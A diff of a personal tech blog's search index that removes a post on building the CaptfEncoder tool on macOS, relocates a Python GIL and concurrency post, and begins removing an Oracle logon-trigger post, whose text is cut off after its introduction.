@@ -1,34 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CaptfEncoder编译</title>
-    <url>/archives/80d64a8d.html</url>
-    <content><![CDATA[<p>解决CaptfEncoder无法在MacOS上运行。<br><img data-src="https://s2.loli.net/2023/07/11/Sbd7FWLkODvZjU5.jpg"></p>
-<span id="more"></span>
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>直接从GitHub下载下来的CaptfEncoder在MacOS M系列芯片上无法正常运行。根据issues提示是缺少GMP Library。通过brew安装之后，还是无法直接运行。</p>
-<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>gmp</span><br></pre></td></tr></table></figure>
-<p><img data-src="https://s2.loli.net/2023/07/11/ED4mHRchN9J6uWn.jpg"><br>通过find命令查找libgmp.10.dylib将其复制到对应目录</p>
-<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">sudo <span class="keyword">find</span> / -name <span class="string">&quot;libgmp.10.dylib&quot;</span></span><br><span class="line">cp <span class="regexp">/System/</span>Volumes<span class="regexp">/Data/</span>opt<span class="regexp">/homebrew/</span>Cellar<span class="regexp">/gmp/</span><span class="number">6.2</span>.<span class="number">1</span>_1<span class="regexp">/lib/</span>libgmp.<span class="number">10</span>.dylib <span class="regexp">/usr/</span>local<span class="regexp">/opt/gm</span>p<span class="regexp">/lib/</span>libgmp.<span class="number">10</span>.dylib</span><br></pre></td></tr></table></figure>
-<p>这时候提示变为<code>mach-o file, but is an incompatible architecture (have &#39;arm64&#39;, need &#39;x86_64&#39;)</code><br><img data-src="https://s2.loli.net/2023/07/11/1v5MLwYq2dVyIo8.jpg"></p>
-<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>下载源码，进入对应目录使用使用cargo运行提示报错</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/guyoung/</span>CaptfEncoder.git</span><br><span class="line">cd CaptfEncoder/CaptfEncoder-V3</span><br><span class="line">cargo run</span><br></pre></td></tr></table></figure>
-<p><img data-src="https://s2.loli.net/2023/07/11/FjYEaohqJ9OzfWX.jpg"><br>根据提示可以知道还是缺少gmp库导致的，根据猜测应该是对应的依赖没被找到。<br>将brew对应的lib加入到环境变量中<code>export LIBRARY_PATH=/opt/homebrew/lib</code>，再运行即可完美解决。<br><img data-src="https://s2.loli.net/2023/07/11/FoEU4hH763RqapT.jpg"></p>
-<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>CaptfEncoder本身已经做了编译的配置，只需要调整Cargo.toml内容即可：</p>
-<ol>
-<li>package中添加description</li>
-<li>icon中修改为app.ico<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;captfencoder&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;3.3.0&quot;</span></span><br><span class="line"><span class="attr">authors</span> = [<span class="string">&quot;guyoung&quot;</span>]</span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"><span class="attr">build</span> = <span class="string">&quot;build.rs&quot;</span></span><br><span class="line"><span class="attr">description</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">fltk</span> = <span class="string">&quot;1.4&quot;</span></span><br><span class="line"><span class="attr">fltk-theme</span> = <span class="string">&quot;0.7&quot;</span></span><br><span class="line"><span class="attr">rhai</span> = <span class="string">&quot;1.15&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tokio</span> = &#123; version = <span class="string">&quot;1&quot;</span>, features = [<span class="string">&quot;full&quot;</span>] &#125;</span><br><span class="line"><span class="attr">reqwest</span> = &#123; version = <span class="string">&quot;0.11&quot;</span>, features = [<span class="string">&quot;json&quot;</span>] &#125;</span><br><span class="line"><span class="attr">serde</span> = <span class="string">&quot;1.0&quot;</span></span><br><span class="line"><span class="attr">serde_json</span> = <span class="string">&quot;1.0&quot;</span></span><br><span class="line"><span class="attr">pollster</span> = <span class="string">&quot;0.2&quot;</span></span><br><span class="line"><span class="attr">base64</span> = <span class="string">&quot;0.13&quot;</span></span><br><span class="line"><span class="attr">anyhow</span> = <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="attr">image</span> = <span class="string">&quot;0.23&quot;</span></span><br><span class="line"><span class="attr">clipboard</span> = <span class="string">&quot;0.5&quot;</span></span><br><span class="line"><span class="attr">rust-embed</span> = <span class="string">&quot;6.3&quot;</span></span><br><span class="line"><span class="attr">webbrowser</span> = <span class="string">&quot;0.5&quot;</span></span><br><span class="line"><span class="attr">rand</span> = <span class="string">&quot;0.8&quot;</span></span><br><span class="line"><span class="attr">dyn-clone</span> = <span class="string">&quot;1.0&quot;</span></span><br><span class="line"><span class="attr">sysinfo</span> = <span class="string">&quot;0.29&quot;</span></span><br><span class="line"><span class="attr">chrono</span> = <span class="string">&quot;0.4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">captfencoder_encoding</span> = &#123; version = <span class="string">&quot;1.0.0&quot;</span>, path = <span class="string">&quot;../encoding&quot;</span>&#125;</span><br><span class="line"><span class="attr">captfencoder_query</span> = &#123; version = <span class="string">&quot;1.0.0&quot;</span>, path = <span class="string">&quot;../query&quot;</span>&#125;</span><br><span class="line"><span class="attr">captfencoder_misc</span> = &#123; version = <span class="string">&quot;1.0.0&quot;</span>, path = <span class="string">&quot;../misc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">lazy_static</span> = <span class="string">&quot;1.4&quot;</span></span><br><span class="line"><span class="attr">state</span> = <span class="string">&quot;0.5&quot;</span></span><br><span class="line"><span class="attr">enum-ordinalize</span> = <span class="string">&quot;3.1&quot;</span></span><br><span class="line"><span class="attr">sublime_fuzzy</span> = <span class="string">&quot;0.7&quot;</span></span><br><span class="line"><span class="attr">crossbeam-channel</span> = <span class="string">&quot;0.5&quot;</span></span><br><span class="line"><span class="attr">event-emitter-rs</span> = <span class="string">&quot;0.1&quot;</span></span><br><span class="line"><span class="attr">hey_listen</span> = <span class="string">&quot;0.5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">num</span> = <span class="string">&quot;0.4&quot;</span></span><br><span class="line"><span class="attr">num-bigint</span> = <span class="string">&quot;0.4&quot;</span></span><br><span class="line"><span class="attr">num-traits</span> = <span class="string">&quot;0.2&quot;</span></span><br><span class="line"><span class="attr">primal</span> = <span class="string">&quot;0.3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[build-dependencies]</span></span><br><span class="line"><span class="attr">winresource</span> = <span class="string">&quot;0.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[package.metadata.winresource]</span></span><br><span class="line"><span class="attr">ProductName</span> = <span class="string">&quot;CaptfEncoder&quot;</span></span><br><span class="line"><span class="attr">ProductVersion</span> = <span class="string">&quot;3.3.0&quot;</span></span><br><span class="line"><span class="attr">OriginalFilename</span> = <span class="string">&quot;CaptfEncoder.exe&quot;</span></span><br><span class="line"><span class="attr">LegalCopyright</span> = <span class="string">&quot;Copyright © Guyoung studio 2022&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">[package.metadata.bundle]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;CaptfEncoder&quot;</span></span><br><span class="line"><span class="attr">identifier</span> = <span class="string">&quot;net.guyoung.captfencoder&quot;</span></span><br><span class="line"><span class="attr">icon</span> = [<span class="string">&quot;app.ico&quot;</span>]</span><br><span class="line"><span class="comment">#deb_depends = []</span></span><br><span class="line"><span class="attr">osx_minimum_system_version</span> = <span class="string">&quot;10.0&quot;</span></span><br></pre></td></tr></table></figure>
-之后通过<code>cargo bundle</code>编译即可<br><img data-src="https://s2.loli.net/2023/07/11/BpsQiOrxJSZm7wc.jpg"></li>
-</ol>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ol>
-<li>使用cargo时遇到无法通过更新、下载的问题，通过添加CARGO_HTTP_MULTIPLEXING即可解决（多线程下载）<code>CARGO_HTTP_MULTIPLEXING=false cargo update</code><br><img data-src="https://s2.loli.net/2023/07/11/neb76YpPADI5LFy.jpg"></li>
-<li>需要在zshrc在添加<code>export LIBRARY_PATH=/opt/homebrew/lib</code>避免之后又遇到找不到lib的情况</li>
-</ol>
-]]></content>
-      <categories>
-        <category>瞎折腾</category>
-      </categories>
-  </entry>
-  <entry>
     <title>家庭组网-软路由</title>
     <url>/archives/fb727318.html</url>
     <content><![CDATA[<p>最近在折腾家庭组网，买了一个软路由：N5105+16G+256 SSD。pve+ikuai+openwrt。由于有两条宽带（移动+电信），因此，使用ikuai进行分流，op进行科学。</p>
@@ -128,86 +100,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python多线程&amp;&amp;多进程&amp;&amp;协程</title>
-    <url>/archives/f4423a86.html</url>
-    <content><![CDATA[<p>针对Python的多线程、多进程、协程等进行学习。</p>
-<span id="more"></span>
-
-<h1 id="Python-多线程-多进程-协程"><a href="#Python-多线程-多进程-协程" class="headerlink" title="Python 多线程 多进程 协程"></a>Python 多线程 多进程 协程</h1><h2 id="GIL——Global-Interpreter-Lock"><a href="#GIL——Global-Interpreter-Lock" class="headerlink" title="GIL——Global Interpreter Lock"></a>GIL——Global Interpreter Lock</h2><p>如果要谈python的多线程、多进程、协程，那么必须要先说一下GIL（Global Interpreter Lock——全局解释器锁）。GIL主要是用来保护访问Python对象的互斥锁（当多个线程同时去请求同一个对象是如果没有进行锁的操作会导致数据异常）。许多时候说到GIL都是直接跟python做了绑定关系，容易造成GIL是python的语言特性，其实，GIL并不是python的语言特性，而是CPython解释器特性（根据名字也可以知道）。由于GIL的关系导致python在同一时刻只有一个线程在运行，这就是大家为什么说python的多线程“无用”的原因。</p>
-<p>python解释器：</p>
-<ul>
-<li>CPython：官方默认解释器，由C语言开发，有GIL</li>
-<li>IPython：基于<code>CPython</code>开发的交互式解释器，只是增强了交互功能，执行功能与<code>CPython</code>完全一样</li>
-<li>PyPy：JIT（Just-In-Time Compiler 即使编译器），对python代码进行动态编译，有GIL</li>
-<li>Jython：Java平台的python解释器，依赖java，无GIL</li>
-<li>IronPython：.Net平台的python解释器，依赖.Net平台，无GIL</li>
-</ul>
-<p>Ps：解释器跟编译器大概的区别：解释器立即执行代码、编译器为执行准备源码。</p>
-<p>GIL可以理解为线程运行许可证，只有当线程拿到GIL时，这个线程才会进入CPU进行运行。那么如果运行CPU密集运算型任务时，多线程没有正面效果（有可能反面效果）。</p>
-<h2 id="多核CPU多线程-lt-单核CPU多线程"><a href="#多核CPU多线程-lt-单核CPU多线程" class="headerlink" title="多核CPU多线程&lt;单核CPU多线程"></a>多核CPU多线程&lt;单核CPU多线程</h2><p>每个CPU在同一时间只能运行一个线程 并发、非并行 </p>
-<p>在python多线程中，每个线程执行方式：</p>
-<ol>
-<li>获取GIL</li>
-<li>执行代码直至sleep或者python虚拟机将其挂起</li>
-<li>释放GIL</li>
-</ol>
-<h3 id="Python2-x"><a href="#Python2-x" class="headerlink" title="Python2.x"></a>Python2.x</h3><p>在python2.x中，GIL释放逻辑是当前线程遇到IO操作或者ticks计数为100。ticks可以理解为python专用做于GIL的计数器，解释器指令，每次释放后归零，可通过sys.setcheckinterval来调整。</p>
-<h3 id="Python3-x"><a href="#Python3-x" class="headerlink" title="Python3.x"></a>Python3.x</h3><p>在python3.x中，GIL释放逻辑不使用ticks进行计数，改用计时器，执行时间达到阀值（5毫秒），当前线程释放GIL。</p>
-<hr>
-<p>当GIL释放后，多核CPU上的线程开始竞争GIL</p>
-<p>单核模型</p>
-<p>A线程获取GIL——A线程运行——A线程释放GIL——B线程获取GIL——B线程运行——B线程释放GIL···</p>
-<p>多核模型</p>
-<p>CPU0:</p>
-<p>A线程获取GIL——A线程运行——A线程释放GIL————B线程获取GIL——————线程B释放GIL——线程C获取</p>
-<p>CPU1:</p>
-<p>—————————————————————唤醒线程Q——线程Q等待——线程Q切换成待调度——唤醒线程W——线程W等待</p>
-<p>通过上述模型可知多核CPU多线程劣于单核CPU多线程（CPU密集型任务）。</p>
-<p>但是在IO密集型任务时多核多线程优于单核CPU多线程，这是因为IO密集型任务主要的时间时消耗在等待中。</p>
-<h2 id="GIL历史背景"><a href="#GIL历史背景" class="headerlink" title="GIL历史背景"></a>GIL历史背景</h2><p>python首次出现时间为1990，那时候CPU厂商还在通过提高核心频率来提高计算机性能。但在2000年后遇到天花板，开始转向多核方向来提高计算机性能。所以在一开始设计解释器时，没有想到多核时代这么快就来了。</p>
-<h1 id="GIL删除？"><a href="#GIL删除？" class="headerlink" title="GIL删除？"></a>GIL删除？</h1><p>删除GIL有一个关键的难点：许多库依赖GIL，默认线程安全，如果删除去除GIL，那么代价太大。</p>
-<h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><p>由于多进程每个进程都有一个GIL，某些情况下多进程比多线程好。多进程劣势：</p>
-<ul>
-<li>相比线程笨重</li>
-<li>切换耗时长</li>
-<li>多进程数量不推荐超过cpu核心数（一个进程一个GIL，一个GIL跑满一个CPU）</li>
-</ul>
-<h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>协程是编译器级，进程、线程是操作系统级。进程、线程由OS调度，开发者无法精确的控制。协程实现的是非抢占式调度，即如何调度可由开发者控制。</p>
-<p>协程优点</p>
-<ul>
-<li>轻量、成本小</li>
-<li>减少CPU开销</li>
-<li>减少同步加锁</li>
-<li>同步思维处理异步代码</li>
-</ul>
-<p>缺点</p>
-<ul>
-<li>不能有阻塞操作</li>
-<li>需特别关注全局变量、对象引用的操作</li>
-</ul>
-<p>协程是基于事件循环方案，</p>
-<h1 id="Python源码保护"><a href="#Python源码保护" class="headerlink" title="Python源码保护"></a>Python源码保护</h1><p>python源码文件py格式，字节码文件pyc、pyo等类型，pyc、pyo这些由解释器所生成的字节码文件，然后解释器再执行字节码文件。因此，可以通过重构一下python解释器来对python源码进行保护。</p>
-<h2 id="Pyc"><a href="#Pyc" class="headerlink" title="Pyc"></a>Pyc</h2><p>pyc文件由三部分组成</p>
-<ul>
-<li><p>最开始4个字节是一个Maigc int, 标识此pyc的版本信息, 不同的版本的 Magic 都在 <code>Python/import.c</code> 内定义</p>
-</li>
-<li><p>接下来四个字节还是个int,是pyc产生的时间(TIMESTAMP, 1970.01.01到产生pyc时候的秒数)</p>
-</li>
-<li><p>接下来是个序列化了的 PyCodeObject(此结构在 <code>Include/code.h</code> 内定义),序列化方法在 <code>Python/marshal.c</code> 内定义</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Magic word to reject .pyc files generated by other Python versions.</span></span><br><span class="line"><span class="comment">   It should change for each incompatible change to the bytecode.</span></span><br><span class="line"><span class="comment">   The value of CR and LF is incorporated so if you ever read or write</span></span><br><span class="line"><span class="comment">   a .pyc file in text mode the magic number will be wrong; also, the</span></span><br><span class="line"><span class="comment">   Apple MPW compiler swaps their values, botching string constants.</span></span><br><span class="line"><span class="comment">   The magic numbers must be spaced apart atleast 2 values, as the</span></span><br><span class="line"><span class="comment">   -U interpeter flag will cause MAGIC+1 being used. They have been</span></span><br><span class="line"><span class="comment">   odd numbers for some time now.</span></span><br><span class="line"><span class="comment">   There were a variety of old schemes for setting the magic number.</span></span><br><span class="line"><span class="comment">   The current working scheme is to increment the previous value by</span></span><br><span class="line"><span class="comment">   10.</span></span><br><span class="line"><span class="comment">   Known values:</span></span><br><span class="line"><span class="comment">       Python 1.5:   20121</span></span><br><span class="line"><span class="comment">       Python 1.5.1: 20121</span></span><br><span class="line"><span class="comment">       Python 1.5.2: 20121</span></span><br><span class="line"><span class="comment">       Python 1.6:   50428</span></span><br><span class="line"><span class="comment">       Python 2.0:   50823</span></span><br><span class="line"><span class="comment">       Python 2.0.1: 50823</span></span><br><span class="line"><span class="comment">       Python 2.1:   60202</span></span><br><span class="line"><span class="comment">       Python 2.1.1: 60202</span></span><br><span class="line"><span class="comment">       Python 2.1.2: 60202</span></span><br><span class="line"><span class="comment">       Python 2.2:   60717</span></span><br><span class="line"><span class="comment">       Python 2.3a0: 62011</span></span><br><span class="line"><span class="comment">       Python 2.3a0: 62021</span></span><br><span class="line"><span class="comment">       Python 2.3a0: 62011 (!)</span></span><br><span class="line"><span class="comment">       Python 2.4a0: 62041</span></span><br><span class="line"><span class="comment">       Python 2.4a3: 62051</span></span><br><span class="line"><span class="comment">       Python 2.4b1: 62061</span></span><br><span class="line"><span class="comment">       Python 2.5a0: 62071</span></span><br><span class="line"><span class="comment">       Python 2.5a0: 62081 (ast-branch)</span></span><br><span class="line"><span class="comment">       Python 2.5a0: 62091 (with)</span></span><br><span class="line"><span class="comment">       Python 2.5a0: 62092 (changed WITH_CLEANUP opcode)</span></span><br><span class="line"><span class="comment">       Python 2.5b3: 62101 (fix wrong code: for x, in ...)</span></span><br><span class="line"><span class="comment">       Python 2.5b3: 62111 (fix wrong code: x += yield)</span></span><br><span class="line"><span class="comment">       Python 2.5c1: 62121 (fix wrong lnotab with for loops and</span></span><br><span class="line"><span class="comment">                            storing constants that should have been removed)</span></span><br><span class="line"><span class="comment">       Python 2.5c2: 62131 (fix wrong code: for x, in ... in listcomp/genexp)</span></span><br><span class="line"><span class="comment">       Python 2.6a0: 62151 (peephole optimizations and STORE_MAP opcode)</span></span><br><span class="line"><span class="comment">       Python 2.6a1: 62161 (WITH_CLEANUP optimization)</span></span><br><span class="line"><span class="comment">       Python 2.7a0: 62171 (optimize list comprehensions/change LIST_APPEND)</span></span><br><span class="line"><span class="comment">       Python 2.7a0: 62181 (optimize conditional branches:</span></span><br><span class="line"><span class="comment">                introduce POP_JUMP_IF_FALSE and POP_JUMP_IF_TRUE)</span></span><br><span class="line"><span class="comment">       Python 2.7a0  62191 (introduce SETUP_WITH)</span></span><br><span class="line"><span class="comment">       Python 2.7a0  62201 (introduce BUILD_SET)</span></span><br><span class="line"><span class="comment">       Python 2.7a0  62211 (introduce MAP_ADD and SET_ADD)</span></span><br><span class="line"><span class="comment">.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>PyCodeObject包含了python代码中所有内容：字符串、常量值以及字节码指令等等</p>
-]]></content>
-      <categories>
-        <category>Code</category>
-        <category>Python3</category>
-      </categories>
-      <tags>
-        <tag>Code</tag>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Go-VSCode环境搭建</title>
     <url>/archives/c70ca2a9.html</url>
     <content><![CDATA[<p>最近项目上用到了Go，因此对VSCode进行Go环境搭建。效果图如下：<br><img data-src="https://i.loli.net/2018/05/20/5b00d3916250e.png" alt="GO debug.png"></p>
@@ -295,6 +187,86 @@
         <tag>Code</tag>
         <tag>VBA</tag>
         <tag>Excel</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python多线程&amp;&amp;多进程&amp;&amp;协程</title>
+    <url>/archives/f4423a86.html</url>
+    <content><![CDATA[<p>针对Python的多线程、多进程、协程等进行学习。</p>
+<span id="more"></span>
+
+<h1 id="Python-多线程-多进程-协程"><a href="#Python-多线程-多进程-协程" class="headerlink" title="Python 多线程 多进程 协程"></a>Python 多线程 多进程 协程</h1><h2 id="GIL——Global-Interpreter-Lock"><a href="#GIL——Global-Interpreter-Lock" class="headerlink" title="GIL——Global Interpreter Lock"></a>GIL——Global Interpreter Lock</h2><p>如果要谈python的多线程、多进程、协程，那么必须要先说一下GIL（Global Interpreter Lock——全局解释器锁）。GIL主要是用来保护访问Python对象的互斥锁（当多个线程同时去请求同一个对象是如果没有进行锁的操作会导致数据异常）。许多时候说到GIL都是直接跟python做了绑定关系，容易造成GIL是python的语言特性，其实，GIL并不是python的语言特性，而是CPython解释器特性（根据名字也可以知道）。由于GIL的关系导致python在同一时刻只有一个线程在运行，这就是大家为什么说python的多线程“无用”的原因。</p>
+<p>python解释器：</p>
+<ul>
+<li>CPython：官方默认解释器，由C语言开发，有GIL</li>
+<li>IPython：基于<code>CPython</code>开发的交互式解释器，只是增强了交互功能，执行功能与<code>CPython</code>完全一样</li>
+<li>PyPy：JIT（Just-In-Time Compiler 即使编译器），对python代码进行动态编译，有GIL</li>
+<li>Jython：Java平台的python解释器，依赖java，无GIL</li>
+<li>IronPython：.Net平台的python解释器，依赖.Net平台，无GIL</li>
+</ul>
+<p>Ps：解释器跟编译器大概的区别：解释器立即执行代码、编译器为执行准备源码。</p>
+<p>GIL可以理解为线程运行许可证，只有当线程拿到GIL时，这个线程才会进入CPU进行运行。那么如果运行CPU密集运算型任务时，多线程没有正面效果（有可能反面效果）。</p>
+<h2 id="多核CPU多线程-lt-单核CPU多线程"><a href="#多核CPU多线程-lt-单核CPU多线程" class="headerlink" title="多核CPU多线程&lt;单核CPU多线程"></a>多核CPU多线程&lt;单核CPU多线程</h2><p>每个CPU在同一时间只能运行一个线程 并发、非并行 </p>
+<p>在python多线程中，每个线程执行方式：</p>
+<ol>
+<li>获取GIL</li>
+<li>执行代码直至sleep或者python虚拟机将其挂起</li>
+<li>释放GIL</li>
+</ol>
+<h3 id="Python2-x"><a href="#Python2-x" class="headerlink" title="Python2.x"></a>Python2.x</h3><p>在python2.x中，GIL释放逻辑是当前线程遇到IO操作或者ticks计数为100。ticks可以理解为python专用做于GIL的计数器，解释器指令，每次释放后归零，可通过sys.setcheckinterval来调整。</p>
+<h3 id="Python3-x"><a href="#Python3-x" class="headerlink" title="Python3.x"></a>Python3.x</h3><p>在python3.x中，GIL释放逻辑不使用ticks进行计数，改用计时器，执行时间达到阀值（5毫秒），当前线程释放GIL。</p>
+<hr>
+<p>当GIL释放后，多核CPU上的线程开始竞争GIL</p>
+<p>单核模型</p>
+<p>A线程获取GIL——A线程运行——A线程释放GIL——B线程获取GIL——B线程运行——B线程释放GIL···</p>
+<p>多核模型</p>
+<p>CPU0:</p>
+<p>A线程获取GIL——A线程运行——A线程释放GIL————B线程获取GIL——————线程B释放GIL——线程C获取</p>
+<p>CPU1:</p>
+<p>—————————————————————唤醒线程Q——线程Q等待——线程Q切换成待调度——唤醒线程W——线程W等待</p>
+<p>通过上述模型可知多核CPU多线程劣于单核CPU多线程（CPU密集型任务）。</p>
+<p>但是在IO密集型任务时多核多线程优于单核CPU多线程，这是因为IO密集型任务主要的时间时消耗在等待中。</p>
+<h2 id="GIL历史背景"><a href="#GIL历史背景" class="headerlink" title="GIL历史背景"></a>GIL历史背景</h2><p>python首次出现时间为1990，那时候CPU厂商还在通过提高核心频率来提高计算机性能。但在2000年后遇到天花板，开始转向多核方向来提高计算机性能。所以在一开始设计解释器时，没有想到多核时代这么快就来了。</p>
+<h1 id="GIL删除？"><a href="#GIL删除？" class="headerlink" title="GIL删除？"></a>GIL删除？</h1><p>删除GIL有一个关键的难点：许多库依赖GIL，默认线程安全，如果删除去除GIL，那么代价太大。</p>
+<h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><p>由于多进程每个进程都有一个GIL，某些情况下多进程比多线程好。多进程劣势：</p>
+<ul>
+<li>相比线程笨重</li>
+<li>切换耗时长</li>
+<li>多进程数量不推荐超过cpu核心数（一个进程一个GIL，一个GIL跑满一个CPU）</li>
+</ul>
+<h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>协程是编译器级，进程、线程是操作系统级。进程、线程由OS调度，开发者无法精确的控制。协程实现的是非抢占式调度，即如何调度可由开发者控制。</p>
+<p>协程优点</p>
+<ul>
+<li>轻量、成本小</li>
+<li>减少CPU开销</li>
+<li>减少同步加锁</li>
+<li>同步思维处理异步代码</li>
+</ul>
+<p>缺点</p>
+<ul>
+<li>不能有阻塞操作</li>
+<li>需特别关注全局变量、对象引用的操作</li>
+</ul>
+<p>协程是基于事件循环方案，</p>
+<h1 id="Python源码保护"><a href="#Python源码保护" class="headerlink" title="Python源码保护"></a>Python源码保护</h1><p>python源码文件py格式，字节码文件pyc、pyo等类型，pyc、pyo这些由解释器所生成的字节码文件，然后解释器再执行字节码文件。因此，可以通过重构一下python解释器来对python源码进行保护。</p>
+<h2 id="Pyc"><a href="#Pyc" class="headerlink" title="Pyc"></a>Pyc</h2><p>pyc文件由三部分组成</p>
+<ul>
+<li><p>最开始4个字节是一个Maigc int, 标识此pyc的版本信息, 不同的版本的 Magic 都在 <code>Python/import.c</code> 内定义</p>
+</li>
+<li><p>接下来四个字节还是个int,是pyc产生的时间(TIMESTAMP, 1970.01.01到产生pyc时候的秒数)</p>
+</li>
+<li><p>接下来是个序列化了的 PyCodeObject(此结构在 <code>Include/code.h</code> 内定义),序列化方法在 <code>Python/marshal.c</code> 内定义</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Magic word to reject .pyc files generated by other Python versions.</span></span><br><span class="line"><span class="comment">   It should change for each incompatible change to the bytecode.</span></span><br><span class="line"><span class="comment">   The value of CR and LF is incorporated so if you ever read or write</span></span><br><span class="line"><span class="comment">   a .pyc file in text mode the magic number will be wrong; also, the</span></span><br><span class="line"><span class="comment">   Apple MPW compiler swaps their values, botching string constants.</span></span><br><span class="line"><span class="comment">   The magic numbers must be spaced apart atleast 2 values, as the</span></span><br><span class="line"><span class="comment">   -U interpeter flag will cause MAGIC+1 being used. They have been</span></span><br><span class="line"><span class="comment">   odd numbers for some time now.</span></span><br><span class="line"><span class="comment">   There were a variety of old schemes for setting the magic number.</span></span><br><span class="line"><span class="comment">   The current working scheme is to increment the previous value by</span></span><br><span class="line"><span class="comment">   10.</span></span><br><span class="line"><span class="comment">   Known values:</span></span><br><span class="line"><span class="comment">       Python 1.5:   20121</span></span><br><span class="line"><span class="comment">       Python 1.5.1: 20121</span></span><br><span class="line"><span class="comment">       Python 1.5.2: 20121</span></span><br><span class="line"><span class="comment">       Python 1.6:   50428</span></span><br><span class="line"><span class="comment">       Python 2.0:   50823</span></span><br><span class="line"><span class="comment">       Python 2.0.1: 50823</span></span><br><span class="line"><span class="comment">       Python 2.1:   60202</span></span><br><span class="line"><span class="comment">       Python 2.1.1: 60202</span></span><br><span class="line"><span class="comment">       Python 2.1.2: 60202</span></span><br><span class="line"><span class="comment">       Python 2.2:   60717</span></span><br><span class="line"><span class="comment">       Python 2.3a0: 62011</span></span><br><span class="line"><span class="comment">       Python 2.3a0: 62021</span></span><br><span class="line"><span class="comment">       Python 2.3a0: 62011 (!)</span></span><br><span class="line"><span class="comment">       Python 2.4a0: 62041</span></span><br><span class="line"><span class="comment">       Python 2.4a3: 62051</span></span><br><span class="line"><span class="comment">       Python 2.4b1: 62061</span></span><br><span class="line"><span class="comment">       Python 2.5a0: 62071</span></span><br><span class="line"><span class="comment">       Python 2.5a0: 62081 (ast-branch)</span></span><br><span class="line"><span class="comment">       Python 2.5a0: 62091 (with)</span></span><br><span class="line"><span class="comment">       Python 2.5a0: 62092 (changed WITH_CLEANUP opcode)</span></span><br><span class="line"><span class="comment">       Python 2.5b3: 62101 (fix wrong code: for x, in ...)</span></span><br><span class="line"><span class="comment">       Python 2.5b3: 62111 (fix wrong code: x += yield)</span></span><br><span class="line"><span class="comment">       Python 2.5c1: 62121 (fix wrong lnotab with for loops and</span></span><br><span class="line"><span class="comment">                            storing constants that should have been removed)</span></span><br><span class="line"><span class="comment">       Python 2.5c2: 62131 (fix wrong code: for x, in ... in listcomp/genexp)</span></span><br><span class="line"><span class="comment">       Python 2.6a0: 62151 (peephole optimizations and STORE_MAP opcode)</span></span><br><span class="line"><span class="comment">       Python 2.6a1: 62161 (WITH_CLEANUP optimization)</span></span><br><span class="line"><span class="comment">       Python 2.7a0: 62171 (optimize list comprehensions/change LIST_APPEND)</span></span><br><span class="line"><span class="comment">       Python 2.7a0: 62181 (optimize conditional branches:</span></span><br><span class="line"><span class="comment">                introduce POP_JUMP_IF_FALSE and POP_JUMP_IF_TRUE)</span></span><br><span class="line"><span class="comment">       Python 2.7a0  62191 (introduce SETUP_WITH)</span></span><br><span class="line"><span class="comment">       Python 2.7a0  62201 (introduce BUILD_SET)</span></span><br><span class="line"><span class="comment">       Python 2.7a0  62211 (introduce MAP_ADD and SET_ADD)</span></span><br><span class="line"><span class="comment">.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>PyCodeObject包含了python代码中所有内容：字符串、常量值以及字节码指令等等</p>
+]]></content>
+      <categories>
+        <category>Code</category>
+        <category>Python3</category>
+      </categories>
+      <tags>
+        <tag>Code</tag>
+        <tag>Python3</tag>
       </tags>
   </entry>
   <entry>
@@ -625,27 +597,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Oracle-LOGON_AUDIT_TRIGGER限制</title>
-    <url>/archives/d36c1a86.html</url>
-    <content><![CDATA[<p>在某次红蓝演练中遇到Oracle用户、密码正确，但无法连接 提示没有权限。</p>
-<p><img data-src="https://s2.loli.net/2023/04/06/oMhbv9KRZicGs4N.png"></p>
-<span id="more"></span>
-
